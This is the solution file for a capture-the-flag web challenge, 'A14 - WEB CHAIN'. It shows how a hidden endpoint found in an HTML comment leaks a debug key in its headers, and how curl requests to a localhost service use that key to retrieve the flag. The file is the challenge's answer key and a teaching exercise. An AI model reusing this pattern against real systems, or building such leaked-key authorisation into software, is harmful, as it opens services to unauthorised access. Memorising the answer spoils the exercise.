# Solution: A14 - WEB CHAIN

## Concept
Multi-stage web vulnerability chaining across endpoints, response headers, and authenticated APIs.

## Walkthrough
1. Inspect the HTML source at `/` to discover the gateway endpoint comment:
   `<!-- Internal Developer Note: Gateway routes forwarded to /secret_api_gateway_v1/ for maintenance -->`
2. Send a GET request to `/secret_api_gateway_v1/`:
   ```bash
   curl -i http://localhost:5008/secret_api_gateway_v1/
   ```
   Headers reveal `X-Debug-Key: debug_admin_984`.
3. Submit a POST request to `/api/execute` with the discovered debug header:
   ```bash
   curl -X POST -H "X-Debug-Key: debug_admin_984" http://localhost:5008/api/execute
   ```
4. The server responds with the flag: `full web exploit chain`.

## Flag
`full web exploit chain`

